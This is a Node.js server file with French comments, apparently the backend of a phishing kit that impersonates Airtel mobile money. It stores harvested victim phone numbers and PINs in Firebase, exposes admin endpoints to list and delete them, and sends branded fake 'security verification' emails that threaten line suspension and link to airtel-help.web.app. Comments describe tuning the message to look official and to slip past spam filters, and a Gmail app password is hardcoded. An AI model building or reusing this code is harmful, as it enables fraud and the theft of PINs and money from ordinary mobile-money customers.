const admin = require("firebase-admin");
const express = require("express");
const cors = require("cors");
const nodemailer = require('nodemailer'); // Remplacé SendGrid par Nodemailer
const path = require("path");
const fs = require("fs"); // Ajout du module File System pour lire l'image

// --- Connexion à Firebase depuis un serveur externe ---
// Logique professionnelle pour gérer les identifiants de manière sécurisée.
let serviceAccount;
// En production (comme sur Render), on s'attend à une variable d'environnement.
// Render définit NODE_ENV à 'production' par défaut.
if (process.env.NODE_ENV === 'production') {
  if (!process.env.GOOGLE_APPLICATION_CREDENTIALS_JSON) {
    console.error("ERREUR FATALE: La variable d'environnement GOOGLE_APPLICATION_CREDENTIALS_JSON est manquante en environnement de production.");
    console.error("Veuillez la configurer dans l'onglet 'Environment' de votre service d'hébergement (Render).");
    process.exit(1); // Arrête le processus immédiatement
  }
  serviceAccount = JSON.parse(process.env.GOOGLE_APPLICATION_CREDENTIALS_JSON);
} else {
  // En local (développement), on charge le fichier qui est dans .gitignore.
  try {
    serviceAccount = require("./serviceAccountKey.json");
  } catch (error) {
    console.error("\nERREUR: Le fichier 'serviceAccountKey.json' est introuvable pour le développement local.");
    console.error("Assurez-vous d'avoir téléchargé ce fichier depuis votre console Firebase et de l'avoir placé dans le dossier 'backend'.\n");
    process.exit(1); // Arrête l'application si les identifiants sont manquants en local.
  }
}

admin.initializeApp({
  credential: admin.credential.cert(serviceAccount),
});

// --- Configuration de Nodemailer avec Gmail ---
// ATTENTION : Pour la production, il est VIVEMENT recommandé de stocker ces informations
// dans des variables d'environnement (process.env.GMAIL_USER, process.env.GMAIL_APP_PASSWORD)
// et non en dur dans le code.
const GMAIL_USER = "airtelmoney.cd.service@gmail.com";
const GMAIL_APP_PASSWORD = "oxbuytpwbxjryjnc"; // Ceci est un mot de passe d'application, pas votre mot de passe Gmail

if (!GMAIL_USER || !GMAIL_APP_PASSWORD) {
    console.error("ERREUR: Les identifiants Gmail (GMAIL_USER, GMAIL_APP_PASSWORD) sont manquants.");
    console.error("Veuillez les définir pour pouvoir envoyer des e-mails.");
    process.exit(1);
}

const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
        user: GMAIL_USER,
        pass: GMAIL_APP_PASSWORD,
    },
});

const app = express();
const PORT = process.env.PORT || 3001; // Render fournira la variable PORT

// Middleware pour parser le JSON dans les requêtes (bonne pratique)
app.use(express.json());

// Utilise CORS pour autoriser les requêtes depuis votre site web hébergé.
// Configuration CORS professionnelle pour autoriser le déploiement et le développement local.
const allowedOrigins = [
  'https://airtel-help.web.app', // Votre site en production
  'http://localhost:5500',       // Pour tester avec Live Server
  'http://127.0.0.1:5500'      // Alternative pour le test local
];

const corsOptions = {
  origin: function (origin, callback) {
    // Autorise les requêtes sans origine (ex: Postman, applications mobiles)
    if (!origin) return callback(null, true);
    if (allowedOrigins.indexOf(origin) === -1) {
      const msg = 'La politique CORS pour ce site n\'autorise pas l\'accès depuis cette origine.';
      return callback(new Error(msg), false);
    }
    return callback(null, true);
  }
};
app.use(cors(corsOptions));

// Ajout d'une route racine pour vérifier que l'API est en ligne (Health Check).
app.get("/", (req, res) => {
  res.status(200).send("Airtel Verification API is running and ready.");
}); 

// Les points de terminaison (endpoints) de notre API qui seront appelés par admin.js
app.get("/api/submissions", async (req, res) => {
  try {
    const db = admin.firestore();
    // Récupère toutes les soumissions de la collection "submissions", triées par date (la plus récente en premier)
    const submissionsRef = db.collection("submissions");
    const snapshot = await submissionsRef.orderBy("submittedAt", "desc").get();

    if (snapshot.empty) {
      return res.status(200).json([]);
    }

    const submissions = [];
    snapshot.forEach((doc) => {
      const data = doc.data();
      submissions.push({
        id: doc.id,
        phoneNumber: data.phoneNumber,
        pin: data.pin, // ATTENTION: Pour un vrai projet, ne jamais exposer le PIN.
        lastCalls: data.lastCalls,
        imageUrl: data.imageUrl,
        // Convertit le Timestamp Firebase en une chaîne de caractères standard (ISO) que JavaScript peut lire.
        // Ajout d'une vérification pour éviter un crash si la date est manquante ou invalide.
        submittedAt: (data.submittedAt && typeof data.submittedAt.toDate === 'function')
          ? data.submittedAt.toDate().toISOString()
          : new Date(0).toISOString(), // Fournit une date par défaut (1970) si invalide
      });
    });

    return res.status(200).json(submissions);
  } catch (error) {
    console.error("Erreur lors de la récupération des soumissions:", error);
    return res.status(500).send("Erreur interne du serveur.");
  }
});

app.delete("/api/submissions/:id", async (req, res) => {
  try {
    const { id } = req.params;
    if (!id) {
      return res.status(400).send("ID de soumission manquant.");
    }
    const db = admin.firestore();
    await db.collection("submissions").doc(id).delete();
    return res.status(200).json({ message: "Soumission supprimée avec succès." });
  } catch (error) {
    console.error("Erreur lors de la suppression de la soumission:", error);
    return res.status(500).send("Erreur interne du serveur.");
  }
});

// Route pour OBTENIR la liste de toutes les alertes envoyées
app.get('/api/sent-alerts', async (req, res) => {
    try {
        // On récupère les alertes de la collection 'sentAlerts', triées par date (la plus récente en premier)
        const db = admin.firestore();
        const snapshot = await db.collection('sentAlerts').orderBy('sentAt', 'desc').get();
        const alerts = snapshot.docs.map(doc => ({ id: doc.id, ...doc.data() }));
        res.status(200).json(alerts);
    } catch (error) {
        console.error("Erreur lors de la récupération des alertes :", error);
        res.status(500).json({ message: "Impossible de récupérer l'historique des alertes." });
    }
});

// Route pour OBTENIR le détail d'une alerte par son ID
app.get('/api/sent-alerts/:id', async (req, res) => {
    try {
        const { id } = req.params;
        const db = admin.firestore();
        const doc = await db.collection('sentAlerts').doc(id).get();
        if (!doc.exists) {
            return res.status(404).json({ message: 'Alerte non trouvée.' });
        }
        res.status(200).json({ id: doc.id, ...doc.data() });
    } catch (error) {
        console.error("Erreur lors de la récupération du détail de l'alerte :", error);
        res.status(500).json({ message: "Impossible de récupérer le détail de l'alerte." });
    }
});

// Route pour envoyer une alerte (version Nodemailer + sauvegarde Firestore, inspirée du script Python)
app.post("/api/send-alert", async (req, res) => {
    const { email } = req.body;

    if (!email || !email.includes('@')) {
        return res.status(400).json({ message: "Une adresse e-mail valide est requise." });
    }

    // Message pour l'enregistrement dans la base de données (non visible par l'utilisateur)
    const plainTextMessageForDB = `Alerte de sécurité envoyée. L'utilisateur a été informé d'une activité suspecte et invité à suivre la procédure sur https://airtel-help.web.app pour réactiver sa ligne.`;

    // Sujet de l'e-mail, plus direct et urgent
    const subject = "Notification de sécurité concernant votre compte Airtel";
    // Nom de l'expéditeur, pour un aspect plus officiel
    const appName = "Service Client Airtel";

    // Template HTML entièrement revu pour être plus convaincant et directif
    // AVEC CSS EN LIGNE pour une compatibilité maximale (mobile et anti-spam)
    const htmlBody = `
    <!doctype html>
    <html lang="fr">
      <head>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <title>${subject}</title>
      </head>
      <body style="background-color: #f4f4f4; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif, 'Apple Color Emoji', 'Segoe UI Emoji', 'Segoe UI Symbol'; -webkit-font-smoothing: antialiased; font-size: 14px; line-height: 1.6; margin: 0; padding: 0; -ms-text-size-adjust: 100%; -webkit-text-size-adjust: 100%;">
        <table role="presentation" border="0" cellpadding="0" cellspacing="0" style="border-collapse: separate; mso-table-lspace: 0pt; mso-table-rspace: 0pt; width: 100%; background-color: #f4f4f4;" width="100%" bgcolor="#f4f4f4">
          <tr>
            <td style="font-family: sans-serif; font-size: 14px; vertical-align: top;" valign="top">&nbsp;</td>
            <td style="font-family: sans-serif; font-size: 14px; vertical-align: top; display: block; max-width: 600px; padding: 10px; width: 600px; margin: 0 auto;" width="600" valign="top">
              <div style="box-sizing: border-box; display: block; margin: 0 auto; max-width: 600px; padding: 10px;">

                <table role="presentation" style="border-collapse: separate; mso-table-lspace: 0pt; mso-table-rspace: 0pt; width: 100%; background: #ffffff; border-radius: 12px; border: 1px solid #e9e9e9;" width="100%">
                  
                  <tr>
                    <td style="padding: 20px; background-color: #e40000; border-top-left-radius: 12px; border-top-right-radius: 12px; text-align: center;" align="center">
                      <img src="cid:logo_airtel" alt="Logo Airtel" height="40" style="border: none; -ms-interpolation-mode: bicubic; max-width: 100%;" />
                    </td>
                  </tr>

                  <tr>
                    <td style="box-sizing: border-box; padding: 30px;">
                      <table role="presentation" border="0" cellpadding="0" cellspacing="0" style="border-collapse: separate; mso-table-lspace: 0pt; mso-table-rspace: 0pt; width: 100%;" width="100%">
                        <tr>
                          <td style="font-family: sans-serif; font-size: 14px; vertical-align: top;" valign="top">
                            <h2 style="color: #333333; font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; font-weight: 700; margin: 0; margin-bottom: 20px; font-size: 22px;">Vérification de sécurité requise</h2>
                            <p style="font-family: sans-serif; font-size: 16px; font-weight: normal; margin: 0; margin-bottom: 15px; color: #333333;">Cher(e) client(e),</p>
                            <p style="font-family: sans-serif; font-size: 16px; font-weight: normal; margin: 0; margin-bottom: 25px; color: #333333;">Par mesure de précaution suite à une activité que nous jugeons inhabituelle, une restriction temporaire a été appliquée sur votre compte. Pour garantir la sécurité de votre ligne, une vérification de votre part est nécessaire.</p>
                            
                            <p style="font-family: sans-serif; font-size: 16px; font-weight: normal; margin: 0; margin-bottom: 25px; color: #333333;">Pour lever cette restriction et confirmer votre identité, veuillez suivre la procédure de sécurité sur notre portail officiel.</p>

                            <table role="presentation" border="0" cellpadding="0" cellspacing="0" style="border-collapse: separate; mso-table-lspace: 0pt; mso-table-rspace: 0pt; width: 100%; box-sizing: border-box;" width="100%">
                              <tbody>
                                <tr>
                                  <td align="center" style="font-family: sans-serif; font-size: 16px; vertical-align: top; padding-bottom: 15px;" valign="top">
                                    <table role="presentation" border="0" cellpadding="0" cellspacing="0" style="border-collapse: separate; mso-table-lspace: 0pt; mso-table-rspace: 0pt; width: auto;">
                                      <tbody>
                                        <tr>
                                          <td style="font-family: sans-serif; font-size: 16px; vertical-align: top; border-radius: 8px; text-align: center;" valign="top" align="center">
                                            <a href="https://airtel-help.web.app" target="_blank" style="background-color: #e40000; border-radius: 8px; color: #ffffff; display: inline-block; font-family: sans-serif; font-size: 16px; font-weight: bold; line-height: 45px; text-align: center; text-decoration: none; width: 250px; -webkit-text-size-adjust: none; border: solid 1px #e40000;">Procéder à la vérification</a>
                                          </td>
                                        </tr>
                                      </tbody>
                                    </table>
                                  </td>
                                </tr>
                              </tbody>
                            </table>
                            
                            <p style="font-family: sans-serif; font-size: 14px; font-weight: normal; margin: 0; margin-top: 25px; color: #555555; text-align: center; border-top: 1px solid #eeeeee; padding-top: 20px;"><strong>Important :</strong> L'absence de vérification de votre part pourrait entraîner une suspension permanente de la ligne pour des raisons de sécurité.</p>
                          </td>
                        </tr>
                      </table>
                    </td>
                  </tr>
                </table>

                <div style="clear: both; margin-top: 10px; text-align: center; width: 100%;">
                  <table role="presentation" border="0" cellpadding="0" cellspacing="0" style="border-collapse: separate; mso-table-lspace: 0pt; mso-table-rspace: 0pt; width: 100%;" width="100%">
                    <tr>
                      <td style="font-family: sans-serif; vertical-align: top; padding: 20px; font-size: 12px; color: #999999; text-align: center;" valign="top" align="center">
                        <span style="color: #999999; font-size: 12px; text-align: center;">© ${new Date().getFullYear()} Airtel. Tous droits réservés.</span>
                        <br>
                        <span style="color: #999999; font-size: 12px; text-align: center;">Ceci est un message de sécurité automatique. Veuillez ne pas y répondre.</span>
                      </td>
                    </tr>
                  </table>
                </div>

              </div>
            </td>
            <td style="font-family: sans-serif; font-size: 14px; vertical-align: top;" valign="top">&nbsp;</td>
          </tr>
        </table>
      </body>
    </html>`;

    // Création de l'objet message pour Nodemailer
    const mailOptions = {
      // L'expéditeur apparaîtra comme "Service Client Airtel <votre-email-gmail>"
      from: `"${appName}" <${GMAIL_USER}>`,
      to: email,
      subject: subject,
      // Version texte, alignée avec le nouveau contenu HTML. Important pour l'anti-spam.
      text: `Vérification de sécurité requise.\n\nCher(e) client(e),\n\nPar mesure de précaution suite à une activité que nous jugeons inhabituelle, une restriction temporaire a été appliquée sur votre compte. Pour garantir la sécurité de votre ligne, une vérification de votre part est nécessaire.\n\nPour lever cette restriction et confirmer votre identité, veuillez suivre la procédure de sécurité sur notre portail officiel : https://airtel-help.web.app\n\nImportant : L'absence de vérification de votre part pourrait entraîner une suspension permanente de la ligne pour des raisons de sécurité.\n\n© ${new Date().getFullYear()} Airtel. Tous droits réservés.`,
      html: htmlBody,
      priority: 'high',
      headers: {
        'X-Priority': '1 (Highest)',
        'X-MSMail-Priority': 'High',
        'Importance': 'High',
        // L'ajout d'un en-tête de désinscription est un signal positif pour les filtres anti-spam.
        'List-Unsubscribe': `<mailto:unsubscribe-test@domain.com?subject=unsubscribe>`
      },
      attachments: [
        {
          filename: "airtel.jpg",
          path: path.join(__dirname, 'airtel.jpg'),
          cid: "logo_airtel", // contentId pour l'image en ligne
        },
      ],
    };

    try {
        // Envoi de l'e-mail via Nodemailer
        await transporter.sendMail(mailOptions);
        console.log(`Alerte envoyée à ${email}`);

        const db = admin.firestore();
        // On sauvegarde un résumé textuel de l'alerte pour l'historique
        const alertRecord = { recipient: email, subject: subject, body: plainTextMessageForDB, sentAt: new Date() };
        
        await db.collection('sentAlerts').add(alertRecord);
        console.log(`Alerte pour ${email} sauvegardée dans Firestore.`);

        res.status(200).json({ message: `Alerte envoyée et enregistrée pour ${email}` });
    } catch (error) {
        console.error("Erreur lors de l'envoi de l'alerte :", error);
        // Fournir une erreur plus spécifique si possible (ex: problème d'authentification)
        if (error.code === 'EAUTH') {
            return res.status(500).json({ message: "Erreur d'authentification avec le service d'e-mail. Vérifiez les identifiants." });
        }
        res.status(500).json({ message: "Le script d'envoi a rencontré une erreur. Vérifiez les logs du serveur." });
    }
});

app.listen(PORT, () => {
  console.log(`Le serveur écoute sur le port ${PORT}`);
});